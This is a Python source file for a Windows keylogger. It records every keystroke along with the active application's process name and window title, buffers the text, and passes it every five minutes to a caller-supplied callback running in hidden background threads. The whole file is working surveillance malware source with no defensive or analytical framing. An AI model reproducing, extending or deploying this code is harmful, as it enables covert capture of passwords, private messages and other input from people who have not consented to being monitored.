# keylogger.py — logs every keystroke with active window title

import threading, time, win32gui, win32process, psutil
from pynput import keyboard
from datetime import datetime

_buffer      = []
_buffer_lock = threading.Lock()
_last_window = ""


def _get_active_window() -> str:
    try:
        hwnd = win32gui.GetForegroundWindow()
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        proc = psutil.Process(pid)
        title = win32gui.GetWindowText(hwnd)
        return f"{proc.name()} — {title}"
    except Exception:
        return "unknown"


def _on_press(key):
    global _last_window
    try:
        window = _get_active_window()
        window_tag = f"\n[{datetime.utcnow().strftime('%H:%M:%S')} | {window}]\n" \
                     if window != _last_window else ""
        _last_window = window

        try:
            char = key.char if key.char else ""
        except AttributeError:
            # Special keys
            special = {
                keyboard.Key.space:     " ",
                keyboard.Key.enter:     "\n",
                keyboard.Key.backspace: "[BS]",
                keyboard.Key.tab:       "\t",
                keyboard.Key.caps_lock: "[CAPS]",
                keyboard.Key.shift:     "",
                keyboard.Key.ctrl_l:    "",
                keyboard.Key.ctrl_r:    "",
                keyboard.Key.alt_l:     "",
                keyboard.Key.alt_r:     "",
            }
            char = special.get(key, f"[{key.name}]")

        with _buffer_lock:
            if window_tag:
                _buffer.append(window_tag)
            _buffer.append(char)

    except Exception:
        pass


def flush_buffer() -> str:
    """Return current buffer contents and clear it."""
    with _buffer_lock:
        text = "".join(_buffer)
        _buffer.clear()
    return text


def start(on_flush_callback, flush_interval: int = 300):
    """
    Start keylogger listener in background thread.
    Calls on_flush_callback(text) every flush_interval seconds.
    """
    listener = keyboard.Listener(on_press=_on_press)
    listener.daemon = True
    listener.start()

    def flush_loop():
        while True:
            time.sleep(flush_interval)
            text = flush_buffer()
            if text.strip():
                on_flush_callback(text)

    t = threading.Thread(target=flush_loop, daemon=True)
    t.start()
